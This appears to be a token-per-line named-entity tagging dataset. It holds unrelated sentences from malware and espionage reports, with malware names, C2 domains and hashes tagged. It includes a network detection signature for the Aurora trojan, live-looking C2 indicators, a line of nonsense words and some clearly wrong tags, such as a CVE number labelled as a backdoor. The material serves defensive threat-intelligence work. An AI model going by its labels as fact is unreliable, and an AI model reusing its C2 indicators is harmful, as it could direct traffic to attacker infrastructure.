The	O
ranges	O
are	O
listed	O
below	O
:	O

Over	O
the	O
last	O
year	O
Operation	B-malware.ransom
Manul	I-malware.ransom
has	O
repeatedly	O
targeted	O
our	O
clients	O
in	O
the	O
Respublika	O
case	O
(	O
Irina	O
Petrushova	O
and	O
Alexander	O
Petrushov	O
)	O
,	O
their	O
known	O
associates	O
and	O
family	O
members	O
,	O
and	O
other	O
dissidents	O
involved	O
in	O
litigation	O
with	O
the	O
government	O
of	O
Kazakhstan	O
in	O
Europeans	O
courts	O
,	O
as	O
well	O
as	O
their	O
family	O
members	O
,	O
associates	O
,	O
and	O
attorneys	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
response	O
given	O
to	O
the	O
malware	O
when	O
it	O
makes	O
a	O
request	O
to	O
updateproductdownload.php	O

Fig	O
1	O
.	O

This	O
DLL	O
will	O
be	O
named	O
to	O
resemble	O
existing	O
services	O
(	O
rasmon	O
.	O

It	O
can	O
be	O
decoded	O
with	O
the	O
following	O
Python	O
code	O
:	O

Norman	O
speculated	O
that	O
a	O
group	O
associated	O
with	O
an	O
identified	O
private	O
Indian	O
information	O
security	O
company	O
likely	O
carried	O
out	O
the	O
espionage	O
campaigns	O
.	O

These	O
include	O
both	O
known	O
Lazarus	O
group	O
tools	O
,	O
as	O
well	O
as	O
a	O
rare	O
ransomware	O
variant	O
called	O
'	O
Hermes	B-malware.ransom
'	O
which	O
may	O
have	O
been	O
used	O
as	O
a	O
distraction	O
or	O
cover-up	O
for	O
the	O
security	O
team	O
whilst	O
the	O
heist	O
was	O
occurring	O
.	O

C	O
&	O
C	O
Command	O
Parser	O
COPYCATS	O
AND	O
VARIANTS	O

All	O
of	O
them	O
lie	O
in	O
ranges	O
of	O
the	O
Jilin	O
Province	O
Network	O
and	O
Liaoning	O
Province	O
Network	O
,	O
in	O
China	O
.	O

All	O
rights	O
reserved	O
.	O

If	O
implemented	O
correctly	O
,	O
this	O
renders	O
packet	O
capture	O
in	O
forensic	O
analysis	O
and	O
automated	O
security	O
products	O
ineffective	O
.	O

Another	O
interesting	O
similarity	O
between	O
the	O
malware	O
families	O
is	O
the	O
configuration	O
of	O
the	O
build	O
system	O
used	O
to	O
compile	O
the	O
binaries	O
.	O

The	O
Tempting	B-malware.infosteal
Cedar	I-malware.infosteal
Spyware	I-malware.infosteal
is	O
split	O
into	O
different	O
modules	O
with	O
specific	O
commands	O
.	O

steinheimman	O
papersaving	O
previliges	O
fundamentive	O
bicorporate	O
miditiming	O
damnatorily	O
munnopsis	O
arzner	O
redtailed	O
roodgoose	O
acholias	O
salefians	O
wartworts	O
frequencyuse	O
nonmagyar	O
shebir	O
getgoing	O

Rapid7	O
published	O
this	O
list	O
of	O
servers	O
,	O
and	O
described	O
their	O
fingerprinting	O
technique	O
.	O

14651276	O
*	O
8	O
+	O
63	O
=	O
117210271	O
Sectors	O
F6	O
–	O
Size	O
of	O
MFT	O
Entry	O
,	O
246	O
.	O

This	O
version	O
is	O
the	O
first	O
version	O
able	O
to	O
be	O
registered	O
as	O
a	O
COM	O
object	O
.	O

The	O
first	O
file	O
is	O
a	O
decoy	O
.	O

The	O
first	O
communicated	O
directly	O
outside	O
the	O
network	O
using	O
a	O
well	O
known	O
RAT	O
protocol	O
and	O
if	O
that	O
failed	O
the	O
secondary	O
much	O
stealthier	O
backdoor	O
communicated	O
to	O
an	O
internal	O
C2	O
address	O
using	O
it	O
's	O
own	O
custom	O
encoded	O
HTTP	O
based	O
protocol	O
.	O

The	O
 le	O
was	O
in	O
a	O
directory	O
alongside	O
a	O
number	O
of	O
hacking	O
tools	O
used	O
by	O
the	O
attackers	O
.	O

Firstly	O
,	O
a	O
CozyDuke	B-malware.drop
sample	O
from	O
February	O
of	O
2012	O
attempts	O
to	O
contact	O
a	O
C	O
&	O
C	O
server	O
at	O
nostressjob.com	O
.	O

'	O
Analysis	O
of	O
Chinese	O
attack	O
against	O
Korean	O
banks	O
,	O
'	O
Avast	O
!	O

I	O
do	O
n't	O
know	O
what	O
'	O
000000+	O
'	O
is	O
but	O
it	O
's	O
also	O
a	O
hard	O
coded	O
value	O
;	O
my	O
best	O
guess	O
is	O
it	O
's	O
to	O
modify	O
the	O
timezone	O
of	O
the	O
timestamp	O
.	O

However	O
judging	O
from	O
the	O
high	O
number	O
of	O
infections	O
,	O
services	O
disrupted	O
,	O
and	O
the	O
fact	O
that	O
information	O
was	O
being	O
harvested	O
from	O
the	O
infected	O
machines	O
at	O
least	O
8	O
months	O
before	O
the	O
dday	O
wipeout	O
,	O
we	O
consider	O
the	O
impact	O
to	O
be	O
high	O
.	O

aurora.init	O
;	O
fl	O
ow	O
:	O
established	O
,	O
from_server	O
;	O
content	O
:	O
'	O
|	O
cc	O
cc	O
cc	O
cc	O
cd	O
cc	O
cc	O
cc	O
cd	O
cc	O
cc	O
cc	O
cc	O
cc	O
cc	O
cc	O
|	O
'	O
;	O
depth:16	O
;	O
classtype	O
:	O
trojan-activity	O
;	O
reference:url,www.trustedsource.org/blog/373/An-Insight-into-the-Aurora-Communication-Protocol	O
;	O
reference:url,doc.emergingthreats.net/2010696	O
;	O
reference:url,www.emergingthreats.net/cgi-bin/cvsweb.cgi/sigs/VIRUS/TROJAN_Aurora	O
;	O
sid:2010696	O
;	O
rev:2	O
;	O
)	O

Symantec	O
World	O
Headquarters	O

Within	O
the	O
32	O
byte	O
field	O
,	O
the	O
first	O
16	O
bytes	O
are	O
the	O
AES	O
decryption	O
key	O
,	O
and	O
the	O
last	O
16	O
bytes	O
store	O
the	O
IV	O
.	O

Tags	O
:	O
apt	O
,	O
APT	O
Campaign	O
News	O
Releases	O
News	O
Articles	O
Trademarks	O
Threat	O
Research	O
FortiGuard	O
Labs	O
Threat	O
Map	O
Threat	O
Briefs	O
Ransomware	O
Blog	O
Fuse	O
About	O
Us	O
Why	O
Fortinet	O
Security	O
Fabric	O
Exec	O
Mgmt	O
Careers	O
Certifications	O
Events	O
Industry	O
Awards	O
(	O
866	O
)	O
868-3678	O
Copyright	O
©	O
2018	O
Fortinet	O
,	O
Inc	O
.	O

This	O
same	O
infrastructure	O
has	O
also	O
been	O
seen	O
in	O
use	O
by	O
OnionDuke	O
.	O

Few	O
cybercrime	O
groups	O
have	O
gained	O
as	O
much	O
notoriety—both	O
for	O
their	O
actions	O
and	O
for	O
their	O
mystique—as	O
the	O
Lazarus	O
group	O
.	O

2016	O
.	O

Introduction	O
Overview	O
APT28	B-malware.infosteal
Targeting	O
And	O
Intrusion	O
Activity	O

Web	O
.	O

They	O
took	O
advantage	O
of	O
the	O
Syrian	O
military	O
conflict	O
for	O
thematic	O
content	O
and	O
file	O
naming	O
'	O
Trump's_Attack_on_Syria_English.docx	O
'	O
.	O

Audit	O
current	O
key	O
state	O
regularly	O
.	O

The	O
technical	O
details	O
of	O
the	O
attack	O
have	O
yet	O
to	O
be	O
made	O
public	O
,	O
however	O
we	O
've	O
recently	O
identified	O
tools	O
uploaded	O
to	O
online	O
malware	O
repositories	O
that	O
we	O
believe	O
are	O
linked	O
to	O
the	O
heist	O
.	O

The	O
purpose	O
is	O
to	O
send	O
collected	O
data	O
to	O
a	O
C2	O
server	O
located	O
at	O
hxxp[:]//techwach[.]com.	B-url.unknown

Full	O
list	O
of	O
patterns	O
extracted	O
from	O
sample	O
:	O

The	O
identified	O
email	O
owners	O
held	O
a	O
wide	O
range	O
of	O
responsibilities	O
within	O
the	O
Hillary	O
for	O
America	O
campaign	O
,	O
extending	O
from	O
senior	O
figures	O
to	O
junior	O
employees	O
and	O
the	O
group	O
mailboxes	O
for	O
various	O
regional	O
offices	O
.	O

Sample	O
A	O
can	O
be	O
categorized	O
as	O
a	O
container	O
,	O
obfuscating	O
and	O
compressing	O
the	O
real	O
payload	O
.	O

Trend	O
Micro	O

Every	O
time	O
a	O
new	O
window	O
becomes	O
active	O
,	O
it	O
retrieves	O
its	O
name	O
and	O
the	O
path	O
to	O
its	O
application	O
and	O
writes	O
this	O
information	O
to	O
the	O
log	O
file	O
:	O

We	O
used	O
the	O
SHA1	O
hash	O
in	O
this	O
case	O
.	O

Our	O
visibility	O
into	O
APT28	B-malware.infosteal
's	O
operations	O
,	O
which	O
date	O
to	O
at	O
least	O
2007	O
,	O
has	O
allowed	O
us	O
to	O
understand	O
the	O
group	O
's	O
malware	O
,	O
operational	O
changes	O
,	O
and	O
motivations	O
.	O

Another	O
category	O
of	O
tools	O
hosted	O
on	O
the	O
same	O
server	O
is	O
port	O
scanning	O
applications	O
,	O
complemented	O
by	O
a	O
set	O
of	O
IP	O
logs	O
passed	O
as	O
an	O
argument	O
to	O
the	O
scanning	O
tools	O
.	O

firefox.exe	O
chrome.exe	O
opera.exe	O
safari.exe	O
The	O
folder	O
C	O
:	O
\Users\Public\Administrador\logs\	O
is	O
created	O
to	O
store	O
screenshots	O
,	O
as	O
well	O
The	O
folder	O
C	O
:	O
\Users\Public\Administrador\logs\	O
is	O
created	O
to	O
store	O
screenshots	O
,	O
as	O
well	O
as	O
the	O
number	O
of	O
mouse	O
clicks	O
the	O
user	O
has	O
triggered	O
while	O
browsing	O
the	O
banking	O
sites	O
(	O
Figure	O
12	O
)	O
.	O

Malware	O
also	O
has	O
the	O
capability	O
to	O
delete	O
itself	O
this	O
is	O
done	O
by	O
making	O
a	O
request	O
to	O
Uninstaller.php	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
network	O
communication	O
pattern	O
where	O
the	O
hostname	O
and	O
the	O
machine	O
time	O
is	O
sent	O
to	O
C2	O
server	O
.	O

Searching	O
for	O
the	O
same	O
username	O
in	O
Gmail	O
(	O
moayy2ad@gmail.com	B-url.normal
)	O
yielded	O
further	O
results	O
.	O

8	O

We	O
assess	O
with	O
moderate	O
confidence	O
that	O
the	O
attacker	O
's	O
long-term	O
objective	O
was	O
to	O
develop	O
the	O
capability	O
to	O
cause	O
a	O
physical	O
consequence	O
.	O

NOVOLEMBRETE	O
creates	O
and	O
stores	O
data	O
sent	O
with	O
the	O
command	O
in	O
the	O
registry	O
key	O
\Software\Microsoft\Internet	O
Explorer\notes	O
.	O

MainHandler	O
CameraShot	O
FileObserver	O
FMServer	O
InjectApp	O
Keylogger	O
Launcher	O
Password	O
ScreenShot	O
Coder	O
Cryptor	O

The	O
malicious	O
document	O
launches	O
the	O
following	O
PowerShell	O
script	O
:	O
Manually	O
executing	O
the	O
PowerShell	O
script	O
at	O
the	O
command	O
line	O
.	O

It	O
was	O
not	O
possible	O
to	O
retrieve	O
the	O
remote	O
file	O
at	O
the	O
time	O
of	O
analysis	O
.	O

When	O
we	O
pivoted	O
and	O
looked	O
for	O
the	O
earliest	O
examples	O
of	O
the	O
DownExecute	B-malware.infosteal
malware	O
,	O
the	O
first	O
samples	O
we	O
could	O
find	O
were	O
compiled	O
in	O
June	O
2014	O
.	O

VictimInfoPacket	O
has	O
an	O
identifier	O
of	O
2	O
(	O
see	O
the	O
dwPktType	O
explanation	O
below	O
)	O
.	O

It	O
specifies	O
fake	O
properties	O
,	O
pretending	O
to	O
be	O
Google	O
or	O
Microsoft	O
.	O

If	O
the	O
past	O
is	O
an	O
accurate	O
indicator	O
,	O
attacks	O
will	O
continue	O
to	O
escalate	O
in	O
both	O
skill	O
and	O
intensity	O
as	O
the	O
attackers	O
implement	O
new	O
tactics	O
in	O
response	O
to	O
defenders	O
acting	O
on	O
previously	O
released	O
information	O
.	O

For	O
compromised	O
legitimate	O
websites	O
we	O
would	O
suggest	O
a	O
minimum	O
1	O
month	O
block	O
be	O
placed	O
on	O
the	O
domain	O
.	O

Other	O
software	O
applications	O
help	O
to	O
support	O
encrypted	O
sessions	O
and	O
communications	O
.	O

IPs	O
(	O
including	O
historic	O
records	O
)	O
:	O

The	O
malware	O
uses	O
the	O
single-byte	O
XOR	O
key	O
0x5C	O
to	O
send	O
the	O
victim	O
's	O
data	O
back	O
to	O
the	O
C2	O
,	O
and	O
in	O
the	O
C2	O
response	O
back	O
to	O
the	O
malware	O
the	O
command	O
arguments	O
received	O
are	O
obfuscated	O
with	O
a	O
different	O
key	O
of	O
0x2E	O
.	O

A	O
further	O
instance	O
of	O
the	O
malicious	O
code	O
appears	O
to	O
have	O
been	O
present	O
on	O
a	O
bank	O
website	O
in	O
Uruguay	O
around	O
2016-10-26	O
when	O
a	O
PCAP	O
of	O
browsing	O
to	O
the	O
website	O
was	O
uploaded	O
to	O
VirusTotal.com	B-url.normal
.	O

v29	O
=	O
1	O
;	O
v30	O
=	O
14	O
;	O
v31	O
=	O
1	O
;	O
v32	O
=	O
getpid	O
(	O
)	O
;	O
v26	O
=	O
648LL	O
;	O
if	O
(	O
sysctl	O
(	O
&	O
v29	O
,	O
4u	O
,	O
&	O
v27	O
,	O
&	O
v26	O
,	O
0LL	O
,	O
0LL	O
)	O
)	O
goto	O
LABEL_13	O
;	O

The	O
malware	O
creates	O
in	O

Industrial	O
group	O
Investment	O
group	O
Server	O
of	O
a	O
university	O
Auxiliary	O
(	O
collecting	O
user	O
data	O
in	O
the	O
waterhole	B-malware.infosteal
attack	O
)	O
Oil	O
and	O
gas	O
sector	O
enterprise	O

The	O
SCT	O
file	O
in	O
the	O
payload	O
(	O
MD5	O
:	O
1554d6fe12830ae57284b389a1132d65	B-hash
)	O
contained	O
the	O
code	O
shown	O
in	O
Figure	O
9	O
.	O

What	O
we	O
came	O
up	O
with	O
is	O
a	O
combination	O
of	O
generic	O
code	O
and	O
interesting	O
strings	O
that	O
we	O
put	O
together	O
into	O
a	O
cohesive	O
rule	O
to	O
single	O
out	O
both	O
BlackEnergy	O
KillDisk	B-malware.ransom
components	O
and	O
ExPetr	O
samples	O
.	O

In	O
particular	O
it	O
was	O
found	O
that	O
registry	O
files	O
and	O
headers	O
were	O
still	O
on	O
the	O
disk	O
.	O

Extracted	O
URL	O
Analysis	O
8	O
.	O

These	O
capabilities	O
can	O
be	O
used	O
for	O
both	O
lateral	O
movement	O
within	O
a	O
compromised	O
organization	O
and	O
to	O
steal	O
information	O
.	O

Your	O
sincere	O
cooperation	O
will	O
be	O
appreciated	O
.	O

Instead	O
,	O
the	O
attacker	O
made	O
several	O
attempts	O
over	O
a	O
period	O
of	O
time	O
to	O
develop	O
and	O
deliver	O
functioning	O
control	O
logic	O
for	O
the	O
SIS	O
controllers	O
in	O
this	O
target	O
environment	O
.	O

Software	O
Vulnerability	O
Information	O
Reputation	O
Center	O
Library	O
Support	O
Communities	O
About	O
Careers	O
Blog	O

Next	O
the	O
component	O
uses	O
the	O
interface	O
to	O
enumerate	O
all	O
OPC	O
items	O
on	O
the	O
server	O
Specifically	O
,	O
it	O
looks	O
for	O
items	O
that	O
contain	O
the	O
following	O
strings	O
in	O
their	O
name	O
:	O
ctlSelOn	O
ctlOperOn	O
ctlSelOff	O
ctlOperOff	O
\Pos	O
and	O
stVal	O
The	O
names	O
of	O
these	O
items	O
may	O
suggest	O
that	O
attackers	O
are	O
interested	O
in	O
OPC	O
items	O
provided	O
by	O
OPC	O
servers	O
that	O
belong	O
to	O
solutions	O
from	O
ABB	O
,	O
such	O
as	O
their	O
MicroSCADA	O
range	O
Figure	O
15	O
demonstrates	O
an	O
example	O
list	O
of	O
OPC	O
items	O
that	O
contain	O
names	O
with	O
similar	O
strings	O
This	O
list	O
of	O
OPC	O
items	O
is	O
received	O
by	O
the	O
OPC	O
Process	O
Objects	O
List	O
Tool	O
from	O
ABB	O
The	O
OPC	O
DA	O
payload	O
does	O
not	O
require	O
any	O
kind	O
of	O
configuration	O
file	O
Once	O
executed	O
by	O
the	O
attacker	O
,	O
it	O
enumerates	O
all	O
OPC	O
servers	O
using	O
the	O
method	O
with	O
category	O
identifier	O
and	O
to	O
identify	O
the	O
ones	O
running	O
The	O
attackers	O
use	O
the	O
string	O
when	O
they	O
add	O
a	O
new	O
OPC	O
group	O
Possibly	O
this	O
string	O
is	O
used	O
by	O
the	O
attackers	O
as	O
a	O
slang	O
term	O
when	O
referring	O
to	O
the	O
ABB	O
solutions	O

The	O
only	O
differentiation	O
between	O
actors	O
at	O
this	O
point	O
exclusively	O
relies	O
on	O
identifying	O
the	O
motivations	O
and	O
the	O
context	O
.	O

Several	O
Enterprise	O
products	O
have	O
the	O
capability	O
to	O
scan	O
for	O
and	O
potentially	O
remove	O
the	O
Aurora	B-malware.infosteal
malware	O
.	O

NCCIC	O
:	O

FireEye	O
has	O
invented	O
a	O
purpose-built	O
,	O
virtual	O
machine-based	O
security	O
platform	O
that	O
provides	O
real-time	O
threat	O
protection	O
to	O
enterprises	O
and	O
governments	O
worldwide	O
against	O
the	O
next	O
generation	O
of	O
cyber	O
attacks	O
.	O

The	O
njRAT	B-malware.backdoor
attacker	O
control	O
panel	O
and	O
the	O
features	O
in	O
the	O
attacker	O
control	O
panel	O
is	O
shown	O
in	O
the	O
below	O
screen	O
shot	O
.	O

Another	O
Potential	O
MuddyWater	O
Campaign	O
uses	O
Powershell-based	O
PRB-Backdoor	B-malware.backdoor
June	O
Patch	O
Tuesday	O
:	O
Microsoft	O
Addresses	O
DNS-related	O
Vulnerability	O
,	O
Adobe	O
Patches	O
Critical	O
Flash	O
Player	O
Flaw	O
How	O
Machine	O
Learning	O
Techniques	O
Helped	O
Us	O
Find	O
Massive	O
Certificate	O
Abuse	O
by	O
BrowseFox	O
Attack	O
Vectors	O
in	O
Orbit	O
:	O
The	O
Need	O
for	O
IoT	O
and	O
Satellite	O
Security	O
in	O
the	O
Age	O
of	O
5G	O
New	O
KillDisk	O
Variant	O
Hits	O
Latin	O
American	O
Financial	O
Organizations	O
Again	O

Once	O
executed	O
by	O
CozyDuke	B-malware.drop
,	O
these	O
executables	O
function	O
independently	O
of	O
CozyDuke	B-malware.drop
's	O
main	O
component	O
.	O

Value	O

One	O
such	O
Japanese-language	O
decoy	O
documents	O
used	O
by	O
the	O
'	O
DragonOK	B-malware.infosteal
'	O
group	O
is	O

This	O
report	O
will	O
focus	O
on	O
the	O
server-client	O
variant	O
(	O
or	O
simply	O
,	O
the	O
'	O
server	O
variant	O
'	O
)	O
of	O
Derusbi	B-malware.backdoor
,	O
which	O
acts	O
as	O
a	O
server	O
on	O
a	O
victim	O
's	O
machine	O
and	O
waits	O
for	O
commands	O
from	O
a	O
controlling	O
client	O
.	O

We	O
have	O
observed	O
a	O
greater	O
degree	O
of	O
care	O
among	O
many	O
in	O
the	O
opposition	O
when	O
facing	O
certain	O
situations	O
that	O
were	O
common	O
attack	O
modalities	O
in	O
2012	O
.	O

The	O
M.E.Doc	O
has	O
an	O
internal	O
messaging	O
and	O
document	O
exchange	O
system	O
so	O
attackers	O
could	O
send	O
spearphishing	O
messages	O
to	O
victims	O
.	O

It	O
is	O
notable	O
that	O
the	O
operational	O
level	O
and	O
the	O
technological	O
sophistication	O
of	O
the	O
attackers	O
are	O
not	O
high	O
.	O

Malware	B-malware.drop
is	O
typically	O
used	O
as	O
an	O
attack	O
vector	O
,	O
but	O
the	O
real	O
threat	O
involves	O
human	O
operators	O
who	O
adapt	O
,	O
adjust	O
,	O
and	O
improve	O
their	O
methods	O
based	O
on	O
the	O
victim	O
's	O
defenses	O
.	O

Sept	O
11	O
2012	O

Additionally	O
,	O
the	O
malware	O
checks	O
the	O
SerialNumber	O
and	O
the	O
version	O
of	O
the	O
BIOS	O
.	O

Once	O
this	O
service	O
is	O
installed	O
on	O
the	O
targeted	O
host	O
,	O
the	O
system	O
is	O
completely	O
compromised	O
,	O
as	O
it	O
has	O
a	O
vast	O
array	O
of	O
espionage	O
capabilities	O
(	O
including	O
Remote	O
Terminal	O
)	O
that	O
can	O
be	O
used	O
to	O
move	O
laterally	O
across	O
the	O
network	O
.	O

HOME	O
AND	O
HOME	O
OFFICE	O
|	O
FOR	O
BUSINESS	O
|	O
SECURITY	O
INTELLIGENCE	O
|	O
ABOUT	O
TREND	O
MICRO	O
Asia	O
Pacific	O
Region	O
(	O
APAC	O
)	O
:	O
Australia	O
/	O
New	O
Zealand	O
,	O
,	O
,	O
,	O
Europe	O
,	O
Middle	O
East	O
,	O
&	O
Africa	O
Region	O
(	O
EMEA	O
)	O
:	O
France	O
,	O
Deutschland	O
/	O
Österreich	O
/	O
Schw	O
eiz	O
,	O
Italia	O
,	O
Россия	O
,	O
España	O
,	O
United	O
Kingdom	O
/	O
Ireland	O
Latin	O
America	O
Region	O
(	O
LAR	O
)	O
:	O
Brasil	O
,	O
México	O
North	O
America	O
Region	O
(	O
NABU	O
)	O
:	O
United	O
States	O
,	O
Canada	O
Privacy	O
Statement	O
Legal	O
Policies	O
Copyright	O
©	O
2018	O
Trend	O
Micro	O
Incorporated	O
.	O

For	O
full	O
details	O
,	O
please	O
reference	O
our	O
2014	O
report	O
,	O
APT28	B-malware.infosteal
:	O
A	O
Window	O
into	O
Russia	O
's	O
Cyber	O
Espionage	O
Operations	O
?	O

APIs	O
from	O
the	O
following	O
libraries	O
are	O
loaded	O
at	O
runtime	O
:	O
Kernel32.dll	O
Ws2_32/wsock32.dll	O
Apvapi32.dll	O
Oleaut32.dll	O
Iphlp.dll	O
Urlmon.dll	O
A	O
dynamic	O
API	O
loaded	O
by	O
the	O
malware	O
.	O

Later	O
in	O
this	O
blog	O
,	O
we	O
will	O
share	O
some	O
of	O
the	O
configuration	O
details	O
we	O
have	O
extracted	O
during	O
our	O
subsequent	O
analysis	O
.	O

This	O
blog	O
post	O
is	O
authored	O
by	O
Warren	O
Mercer	O
and	O
Paul	O
Rascagneres	O
.	O

Example	O
log	O
file	O
contents	O
are	O
presented	O
as	O
follows	O
:	O
St	O
01/18/13	O
12:03:30	O
into	O
d81596a9	O
ar	O
01/18/13	O
12:03:44	O
Total:30532M	O
,	O
Free:30387M	O
End	O
copy	O
:	O
E:\RECYCLED\RECYCLED\SYS\file1.txt	O
End	O
copy	O
:	O
E	O
:	O
\RECYCLED\RECYCLED\SYS\interesting.txt	O
Re	O
on	O
Fin	O
The	O
following	O
strings	O
,	O
which	O
are	O
not	O
all	O
inclusive	O
or	O
exclusive	O
,	O
could	O
be	O
used	O
to	O
find	O
log	O
files	O
,	O
fragments	O
or	O
contents	O
on	O
devices	O
and	O
on	O
a	O
network	O
:	O

The	O
ThreatConnect	O
Intelligence	O
Research	O
Team	O
(	O
TCIRT	O
)	O
has	O
identified	O
an	O
example	O
of	O
South	O
Asian	O
cyber	O
espionage	O
that	O
is	O
likely	O
transcending	O
sectors	O
and	O
regional	O
geographic	O
boundaries	O
.	O

©	O
2015	O
Cisco	O
Systems	O
,	O
Inc	O
.	O

hProcess	O
=	O
CreateProcessWithLogonW	O
(	O
&	O
Username	O
,	O
&	O
Domain	O
,	O
lpPassword	O
,	O
0	O
,	O
0	O
,	O
&	O
CommandLine	O
,	O
4u	O
,	O
0	O
,	O
&	O
CurrentDirectory	O
,	O
>	O
startupinfo_b	O
,	O
&	O
>	O
process_information	O
)	O

If	O
only	O
one	O
core	O
is	O
detected	O
,	O
it	O
quits	O
as	O
seen	O
in	O
Figure	O
5	O
.	O

This	O
second	O
stage	O
finds	O
and	O
decodes	O
an	O
encoded	O
executable	O
beginning	O
at	O
offset	O
0x33A2	O
.	O

Where	O
possible	O
,	O
minimize	O
server	O
fingerprinting	O
by	O
configuring	O
Web	O
servers	O
to	O
avoid	O
responding	O
with	O
banners	O
identifying	O
the	O
server	O
software	O
and	O
version	O
number	O
.	O

Additionally	O
the	O
dynamic	O
DNS	O
domains	O
'	O
fighthard.mooo.com	B-url.unknown
'	O
and	O
'	O
rampage.freetcp.com	B-url.unknown
'	O
have	O
both	O
historically	O
resolved	O
to	O
this	O
IP	O
address	O
.	O

Should	O
I	O
send	O
malicious	O
documents	O
targeting	O
CVE-2012-0158	B-malware.backdoor
or	O
not	O
?	O
)	O

2008	O
01.01	O
.	O

The	O
sample	O
iDefense	O
identified	O
is	O
a	O
malicious	O
Microsoft	O
Corp	O
.	O

[	O
그림	O
2	O
]	O
는	O
지난	O
2015년	O
공격에	O
사용된	O
문서	O
파일이다	O
.	O

Two	O
are	O
PE	O
files	O
.	O

That	O
information	O
is	O
the	O
following	O
:	O
local	O
hostname	O
organization	O
owner	O
operating	O
system	O
details	O
CPU	O
speed	O
total	O
physical	O
memory	O
The	O
string	O
is	O
sent	O
to	O
the	O
remote	O
host	O
and	O
the	O
response	O
is	O
checked	O
to	O
see	O
if	O
the	O
first	O
byte	O
of	O
the	O
response	O
is	O
0xF4	O
,	O
an	O
arbitrary	O
byte	O
.	O

Headquarters	O
(	O
netsat.exe	O
)	O
Functionality	O
–	O
C2	O
Mechanism	O

Instead	O
,	O
we	O
observed	O
the	O
two	O
Russian	O
espionage	O
groups	O
compromise	O
the	O
same	O
systems	O
and	O
engage	O
separately	O
in	O
the	O
theft	O
of	O
identical	O
credentials	O
.	O

Launched	O
a	O
ZLIB	O
compressed	O
and	O
Base64	O
encoded	O
command	O
with	O
PowerShell	O
.	O

Blogs	O

During	O
a	O
particular	O
campaign	O
,	O
conventional	O
Poseidon	B-malware.infosteal
samples	O
were	O
directed	O
to	O
IPs	O
resolving	O
to	O
satellite	O
uplinks	O
.	O

11	O
.	O

In	O
particular	O
,	O
the	O
operation	O
requires	O
a	O
massive	O
back-end	O
infrastructure	O
to	O
store	O
,	O
decrypt	O
and	O
analyze	O
several	O
GB	O
per	O
day	O
of	O
unstructured	O
data	O
that	O
is	O
being	O
captured	O
from	O
its	O
targets	O
.	O

However	O
,	O
examination	O
of	O
its	O
header	O
states	O
that	O
its	O
actual	O
file	O
name	O
is	O
supposed	O
to	O
be	O
.	O

'	O
Using	O
the	O
Sample	O
Grabber	O
.	O
'	O

In	O
this	O
article	O
,	O
the	O
G	O
DATA	O
SecurityLabs	O
will	O
have	O
a	O
look	O
at	O
the	O
following	O
topics	O
:	O
an	O
example	O
of	O
the	O
spear	O
phishing	O
campaign	O
,	O
sent	O
only	O
a	O
few	O
days	O
after	O
the	O
malware	O
has	O
been	O
advertised	O
the	O
marketing	O
approach	O
to	O
sell	O
the	O
malware	O
the	O
analysis	O
of	O
some	O
of	O
Kraken	B-malware.ransom
's	O
features	O
theories	O
about	O
why	O
Kraken	B-malware.ransom
has	O
been	O
used	O
as	O
malware	O
in	O
a	O
targeted	O
attack	O
The	O
attacker	O
(	O
s	O
)	O
sent	O
a	O
specially	O
crafted	O
email	O
to	O
at	O
least	O
one	O
employee	O
of	O
the	O
attacked	O
enterprise	O
.	O

The	O
implant	O
is	O
installed	O
regardless	O
of	O
whether	O
or	O
not	O
the	O
victim	O
completes	O
the	O
FreeGate	B-malware.infosteal
installation	O
process	O
.	O

Evidence	O
points	O
to	O
the	O
attackers	O
being	O
a	O
Lebanese	B-malware.unknown
hacking	O
group	O
;	O
however	O
,	O
we	O
can	O
not	O
be	O
100	O
%	O
sure	O
this	O
is	O
true	O
.	O

To	O
make	O
a	O
long	O
story	O
short	O
,	O
this	O
routine	O
uses	O
the	O
Windows	O
APIs	O

6	O
Related	O
indicators	O
information	O

The	O
FinSpy	B-malware.infosteal
tool	O
is	O
part	O
of	O
the	O
FinFisher	B-malware.infosteal
intrusion	O
and	O
monitoring	O
toolkit	O
.	O

Thumbprint	O
:	O
B366DBE8B3E81915CA5C5170C65DCAD8348B11F0	O

De	O
Anza	O
Blvd.Cupertino	O
,	O
CA	O
95014U.S	O
.	O

It	O
consistently	O
archives	O
RTLO	O
.scr	O
executable	O
files	O
within	O
.rar	O
archives	O
,	O
in	O
order	O
to	O
appear	O
to	O
the	O
target	O
as	O
innocuous	O
.jpg	O
files	O
.	O

rule	O
ce_enfal_cmstar_debug_msg	O

In	O
this	O
campaign	O
,	O
we	O
see	O
the	O
adoption	O
of	O
a	O
recent	O
zero-day	O
Adobe	O
Flash	O
vulnerability	O
to	O
get	O
the	O
implant	O
onto	O
the	O
victim	O
's	O
systems	O
.	O

Upon	O
configuring	O
the	O
client	O
,	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
provides	O
example	O
connection	O
syntax	O
.	O

3	O
.	O

Figure	O
7	O
:	O
Compile	O
dates	O
for	O
all	O
three	O
malware	O
families	O

It	O
will	O
wipe	O
data	O
found	O
in	O
the	O
Documents	O
and	O
Settings	O
folder	O
and	O
the	O
System32	O
folder	O
,	O
and	O
then	O
use	O
a	O
signed	O
driver	O
for	O
disk	O
access	O
to	O
start	O
wiping	O
at	O
the	O
disk	O
level	O
.	O

'	O
Version	O
'	O
:	O
Dino	B-malware.backdoor
's	O
code	O
version	O
;	O
here	O
set	O
to	O
'	O
1.2	O
'	O
,	O
which	O
is	O
confirmed	O
by	O
the	O
'	O
din12	O
'	O
folder	O
used	O
in	O
one	O
of	O
the	O
C	O
&	O
C	O
URLs	O
.	O

The	O
patch	O
will	O
replace	O
this	O
2-byte	O
conditional	O
jump	O
with	O
2	O
'	O
do-nothing	O
'	O
(	O
NOP	O
)	O
instructions	O
,	O
effectively	O
forcing	O
the	O
host	O
application	O
to	O
believe	O
that	O
the	O
failed	O
check	O
has	O
in	O
fact	O
succeeded	O
.	O

0A67F9CC30083AFB7E1F8295AE152BB6	B-hash
skype.servemp3.com	B-url.cncsvr
US	O

The	O
malware	O
attempts	O
to	O
spoof	O
the	O
host	O
and	O
query	O
non-existing	O
domains	O
,	O
such	O
as	O
the	O
following	O
:	O
3qyo4o7.7r7i3[.]info	B-url.unknown
dtdf5vu.nt7yq[.]info	B-url.unknown
38qmk6.0to9[.]info	O
ubkv1t.ec0[.]com	O
j.4tc3ldw.g9ml.www0[.]org	B-url.unknown
7g91xhp.envuy3[.]net	O
l.hovux.eln9wj7.7gpj[.]org	O
w.7sytdjc.wroi.cxy[.]com	O
This	O
is	O
likely	O
done	O
to	O
throw	O
off	O
malware	O
analysts	O
or	O
network	O
administrators	O
.	O

14	O
.	O

Appendix	O
A	O
